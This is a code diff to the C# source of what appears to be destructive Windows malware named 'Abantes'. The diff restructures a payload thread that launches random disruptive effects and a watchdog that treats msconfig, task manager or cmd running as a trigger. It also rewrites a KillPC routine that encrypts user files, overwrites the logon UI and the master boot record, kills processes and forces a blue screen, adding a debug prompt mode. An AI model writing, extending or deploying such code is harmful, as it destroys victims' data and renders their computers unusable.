@@ -16,87 +16,6 @@ using Microsoft.Win32;
 
 namespace Abantes.Payloads
 {
-    class Threads
-    {
-        static Random _random = new Random();
-        public static void MainPayloadThread()
-        {
-            
-            while (true)
-            {
-                switch (_random.Next(13))
-                {
-                    case 0:
-                        Thread randomOSsound = new Thread(new ThreadStart(Annoying.RandomOSSounds));
-                        randomOSsound.Start();
-                        break;
-                    case 1:
-                        Thread randomKeyboard = new Thread(new ThreadStart(Annoying.RandomKeyboard));
-                        randomKeyboard.Start();
-                        break;
-                    case 2:
-                         Annoying.ChangeWindowText();
-                        break;
-                    case 3:
-                        Thread cursoricon = new Thread(new ThreadStart(Annoying.CursorIcon));
-                        cursoricon.Start();
-                        break;
-                    case 4:
-                        if (_random.Next(100) > 50)
-                        {
-                            Thread mouseTrap = new Thread(new ThreadStart(Annoying.MouseTrap));
-                            mouseTrap.Start();
-                        }
-                        else
-                        {
-                            Annoying.ChangeWindowText();
-                        }
-                        break;
-                    case 5:
-                        Annoying.ChangeWindowText();
-                        break;
-                    case 6:
-                        Annoying.EjectCd();
-                        break;
-                    case 7:
-                        Thread screenscrew = new Thread(new ThreadStart(Annoying.Screen_Screw));
-                        screenscrew.Start();
-                        break;
-                    case 8:
-                        Thread screenglitch = new Thread(new ThreadStart(Annoying.Screen_Glitching));
-                        screenglitch.Start();
-                        break;
-                    case 9:
-                        Thread helpicons = new Thread(new ThreadStart(Annoying.Display_Icons_Error));
-                        helpicons.Start();
-                        break;
-                    case 10:
-                        Thread crazybounce = new Thread(new ThreadStart(Annoying.CrazyBounce));
-                        crazybounce.Start();
-                        break;
-                    case 11:
-                        Thread flip = new Thread(new ThreadStart(Annoying.Flip));
-                        flip.Start();
-                        break;
-                    case 12:
-                        Thread text = new Thread(new ThreadStart(Annoying.Text));
-                        text.Start();
-                        break;
-                }
-                Thread.Sleep(10000);
-            }
-        }
-        public static void WatchDogThread()
-        {
-            string[] NeverRun = { "msconfig", "taskmgr", "cmd" };
-            string[] MustRun = { "Rules" };
-            while (true)
-            {
-                Thread.Sleep(1000);
-                WatchDog.ProcessWatchDog(NeverRun, MustRun);
-            }
-        }
-    }
     class Annoying
     {
         [DllImport("user32.dll")]
@@ -266,11 +185,27 @@ namespace Abantes.Payloads
         }
         public static void KillPC()
         {
-            EncryptUserFiles();
-            LogonUIOverwrite();
-            MBR_Overwrite();
-            KillAll();
-            FORCE_BSOD();
+            if (MainThread.Mode == 1)
+            {
+                if (MessageBox.Show("ENCRYPT?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
+                { EncryptUserFiles(); }
+                if (MessageBox.Show("LOGON UI OVERWRITE?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
+                { LogonUIOverwrite(); }
+                if (MessageBox.Show("MBR OVERWRITE?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
+                { MBR_Overwrite(); }
+                if (MessageBox.Show("KILL ALL TASKS?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
+                { KillAll(); }
+                if (MessageBox.Show("NTRAISEHARDERROR?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
+                { FORCE_BSOD(); }
+            }
+            else
+            {
+                EncryptUserFiles();
+                LogonUIOverwrite();
+                MBR_Overwrite();
+                KillAll();
+                FORCE_BSOD();
+            }
         }
     }
     class WatchDog
@@ -279,9 +214,9 @@ namespace Abantes.Payloads
         {
             //Put each files path in an array to check if it exists
 
-            for (int i = 0; i < sFileName.Count(); i++)
+            foreach (string file in sFileName)
             {
-                if (File.Exists(sFileName[i]) == false)
+                if (File.Exists(file) == false)
                 {
                     Destructive.KillPC();
                 }
@@ -290,34 +225,19 @@ namespace Abantes.Payloads
         public static void ProcessWatchDog(string[] sNeverRun, string[] sMustRun)
         {
             //Put each process to watch for in an array to check if it exists
-
-            for (int i = 0; i < sNeverRun.Count(); i++)
+            
+            foreach (string process in sNeverRun)
             {
-                Process[] proc = Process.GetProcessesByName(sNeverRun[i]);
+                Process[] proc = Process.GetProcessesByName(process);
                 if (proc.Length > 0)
                 {
-
-                    if (proc[0].ToString() == Process.GetProcessesByName("taskmgr")[0].ToString())
-                    {
-                        //Flagged
-                        Destructive.KillPC();
-                    }
-                    else if (proc[0].ToString() == Process.GetProcessesByName("msconfig")[0].ToString())
-                    {
-                        //Flagged
-                        Destructive.KillPC();
-                    }
-                    else
-                    {
-                        //Non-Flagged Process found
-                        Destructive.KillPC();
-                    }
+                    Destructive.KillPC();
                 }
             }
 
-            for (int i = 0; i < sMustRun.Count(); i++)
+            foreach (string process in sMustRun)
             {
-                Process[] proc = Process.GetProcessesByName(sMustRun[i]);
+                Process[] proc = Process.GetProcessesByName(process);
                 if (proc.Length == 0)
                 {
                     //Not Running
@@ -330,5 +250,86 @@ namespace Abantes.Payloads
             }
         }
 
+    }
+    class Threads
+    {
+        static Random _random = new Random();
+        public static void MainPayloadThread()
+        {
+
+            while (true)
+            {
+                switch (_random.Next(13))
+                {
+                    case 0:
+                        Thread randomOSsound = new Thread(new ThreadStart(Annoying.RandomOSSounds));
+                        randomOSsound.Start();
+                        break;
+                    case 1:
+                        Thread randomKeyboard = new Thread(new ThreadStart(Annoying.RandomKeyboard));
+                        randomKeyboard.Start();
+                        break;
+                    case 2:
+                        Annoying.ChangeWindowText();
+                        break;
+                    case 3:
+                        Thread cursoricon = new Thread(new ThreadStart(Annoying.CursorIcon));
+                        cursoricon.Start();
+                        break;
+                    case 4:
+                        if (_random.Next(100) > 50)
+                        {
+                            Thread mouseTrap = new Thread(new ThreadStart(Annoying.MouseTrap));
+                            mouseTrap.Start();
+                        }
+                        else
+                        {
+                            Annoying.ChangeWindowText();
+                        }
+                        break;
+                    case 5:
+                        Annoying.ChangeWindowText();
+                        break;
+                    case 6:
+                        Annoying.EjectCd();
+                        break;
+                    case 7:
+                        Thread screenscrew = new Thread(new ThreadStart(Annoying.Screen_Screw));
+                        screenscrew.Start();
+                        break;
+                    case 8:
+                        Thread screenglitch = new Thread(new ThreadStart(Annoying.Screen_Glitching));
+                        screenglitch.Start();
+                        break;
+                    case 9:
+                        Thread helpicons = new Thread(new ThreadStart(Annoying.Display_Icons_Error));
+                        helpicons.Start();
+                        break;
+                    case 10:
+                        Thread crazybounce = new Thread(new ThreadStart(Annoying.CrazyBounce));
+                        crazybounce.Start();
+                        break;
+                    case 11:
+                        Thread flip = new Thread(new ThreadStart(Annoying.Flip));
+                        flip.Start();
+                        break;
+                    case 12:
+                        Thread text = new Thread(new ThreadStart(Annoying.Text));
+                        text.Start();
+                        break;
+                }
+                Thread.Sleep(10000);
+            }
+        }
+        public static void WatchDogThread()
+        {
+            string[] NeverRun = { "msconfig", "taskmgr", "cmd" };
+            string[] MustRun = { "Rules" };
+            while (true)
+            {
+                Thread.Sleep(1000);
+                WatchDog.ProcessWatchDog(NeverRun, MustRun);
+            }
+        }
     }
 }
